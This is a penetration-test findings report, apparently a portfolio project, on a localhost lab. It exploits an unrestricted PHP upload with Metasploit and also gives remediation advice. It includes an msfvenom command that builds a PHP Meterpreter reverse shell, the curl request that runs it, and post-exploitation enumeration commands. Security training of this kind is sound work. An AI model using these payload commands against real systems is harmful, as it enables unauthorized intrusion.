# Security Findings Report
## Full Internal Penetration Testing Lab Using Metasploit

---

# Project Information

| Attribute | Details |
|------------|------------|
| Project Name | Full Internal Penetration Testing Simulation |
| Environment | Kali Linux Virtual Machine |
| Framework | Metasploit Framework |
| Assessment Type | Internal Red Team Simulation |
| Author | Nitin Sukthe |
| Target Environment | Local Simulated Infrastructure |

---

# Executive Summary

This document contains the security findings identified during a simulated internal penetration testing engagement performed using Kali Linux and the Metasploit Framework.

The assessment focused on identifying vulnerable services, insecure configurations, and exploitation opportunities within a controlled local environment. Multiple services were enumerated, including a vulnerable PHP web application and an exposed internal TCP service.

A successful Remote Code Execution (RCE) attack was achieved through an insecure PHP upload directory, resulting in Meterpreter shell access and post-exploitation interaction with the target system.

The project demonstrates practical Red Team methodologies including reconnaissance, exploitation, post-exploitation, and professional security documentation.

---

# Assessment Scope

## In-Scope Systems

| System | Description |
|------------|----------------------------|
| Kali Linux VM | Attacker Machine |
| webuser Account | Vulnerable Web Environment |
| victim Account | Simulated Internal User |
| PHP Web Server | Local Web Service |
| Echo TCP Service | Internal Network Service |

---

# Methodology

The assessment followed a structured penetration testing methodology:

1. Environment Preparation  
2. Victim Environment Simulation  
3. Service Enumeration  
4. Reconnaissance  
5. Payload Generation  
6. Exploitation  
7. Meterpreter Session Establishment  
8. Post-Exploitation  
9. Documentation and Reporting  

---

# Reconnaissance Findings

## Network Scan Results

### Command Used

```bash
nmap -p 22,8080,9003 127.0.0.1
```

### Open Services Identified

| Port | Service | Description |
|------|----------|-------------|
| 22 | SSH | Remote administration service |
| 8080 | PHP Web Server | Vulnerable upload directory |
| 9003 | Echo TCP Service | Simulated internal service |

---

# Vulnerability Findings

---

# Finding 1 — Remote Code Execution via PHP Upload Directory

| Attribute | Details |
|------------|------------|
| Severity | Critical |
| CVSS Score | 9.8 |
| CWE | CWE-434: Unrestricted File Upload |
| Affected Component | PHP Upload Directory |
| Attack Vector | Remote |
| Authentication Required | No |

---

## Description

The PHP upload directory allowed execution of arbitrary uploaded PHP files.

An attacker could upload a malicious PHP payload and execute it remotely through the local PHP server. This vulnerability enabled full remote code execution on the target environment.

A Meterpreter reverse shell payload generated using msfvenom was successfully executed through the vulnerable upload directory.

---

## Proof of Concept

### Payload Generation

```bash
msfvenom -p php/meterpreter/reverse_tcp \
LHOST=127.0.0.1 \
LPORT=4443 \
-f raw \
-o shell.php
```

### Payload Execution

```bash
curl http://127.0.0.1:8080/shell.php
```

### Meterpreter Session

```bash
meterpreter 
```

---

## Evidence Collected

### Meterpreter Enumeration

```bash
sysinfo
getuid
ls
cat flag.txt
```

### Interactive Shell Access

```bash
shell
whoami
id
uname -a
```

### Sensitive File Retrieved

```text
FLAG{simulated_web_flag}
```

---

## Impact

Successful exploitation could allow attackers to:

- Execute arbitrary commands remotely
- Establish persistent backdoors
- Enumerate internal systems
- Access sensitive files
- Perform privilege escalation
- Conduct lateral movement

---

## Risk Rating

| Risk Factor | Rating |
|-------------|---------|
| Confidentiality Impact | High |
| Integrity Impact | High |
| Availability Impact | High |
| Exploit Complexity | Low |
| Privileges Required | None |

---

## Remediation Recommendations

### Immediate Actions

- Disable PHP execution inside upload directories
- Restrict arbitrary file uploads
- Validate uploaded file extensions
- Apply strict filesystem permissions

### Long-Term Security Improvements

- Deploy a Web Application Firewall (WAF)
- Conduct secure code reviews
- Implement application sandboxing
- Perform regular vulnerability assessments
- Monitor suspicious web activity

---

# Finding 2 — Exposed Internal TCP Echo Service

| Attribute | Details |
|------------|------------|
| Severity | Medium |
| Service Port | 9003 |
| Service Type | Custom TCP Service |
| Exposure | Internal Network |

---

## Description

A custom Echo TCP service was exposed internally on port 9003.

The service responded to arbitrary user input and could potentially be abused for service fingerprinting, fuzzing, or internal reconnaissance.

---

## Proof of Concept

### Connection Test

```bash
nc 127.0.0.1 9003
```

### Example Interaction

```text
hi
ECHO: hi

hello
ECHO: hello
```

---

## Impact

Potential attacker activities include:

- Internal service fingerprinting
- Network reconnaissance
- Service misuse
- Input fuzzing

---

## Recommendations

- Disable unnecessary internal services
- Restrict access using firewall rules
- Monitor abnormal network connections
- Harden internal network segmentation

---

# Post-Exploitation Findings

## Actions Successfully Performed

| Action | Status |
|--------|--------|
| Meterpreter Session Established | Successful |
| System Enumeration | Successful |
| User Enumeration | Successful |
| File Access Validation | Successful |
| Sensitive File Retrieval | Successful |
| Interactive Shell Access | Successful |

---

# Security Risks Identified

## Potential Threat Scenarios

- Unauthorized remote access
- Persistent backdoor installation
- Credential theft
- Data exfiltration
- Privilege escalation
- Lateral movement across systems

---

# Skills Demonstrated

This project demonstrated hands-on experience in:

- Penetration Testing
- Red Team Operations
- Metasploit Exploitation
- Meterpreter Usage
- Network Reconnaissance
- Vulnerability Assessment
- Linux Enumeration
- Security Documentation
- Incident Reporting
- Post-Exploitation Analysis

---

# Recommended Security Controls

## Web Application Security

- Secure file upload validation
- Disable executable uploads
- Harden PHP configurations
- Apply least privilege access

## Infrastructure Security

- Restrict exposed internal services
- Enable network segmentation
- Deploy intrusion detection systems
- Implement centralized logging

## Monitoring and Detection

- Monitor suspicious outbound connections
- Detect Meterpreter traffic patterns
- Analyze abnormal shell execution
- Audit upload directories regularly

---

# Conclusion

The internal penetration testing simulation successfully demonstrated how vulnerable upload functionality and exposed internal services can lead to system compromise.

The assessment validated the effectiveness of Metasploit and Meterpreter for exploitation and post-exploitation activities in a controlled Red Team environment.

This project provided practical experience with reconnaissance, exploitation, shell management, vulnerability analysis, and professional security reporting.

---

# Appendix A — Tools Used

| Tool | Purpose |
|------|----------|
| Kali Linux | Attacker Platform |
| Metasploit Framework | Exploitation Framework |
| msfvenom | Payload Generation |
| Meterpreter | Post-Exploitation Shell |
| Nmap | Reconnaissance |
| Netcat | Service Interaction |
| PHP | Vulnerable Web Service |

---

# Appendix B — Cleanup Commands

```bash
sudo pkill -f php
sudo pkill -f msfconsole
sudo pkill -f ruby
sudo pkill -f fake_service

sudo deluser --remove-home victim
sudo deluser --remove-home webuser
```

---
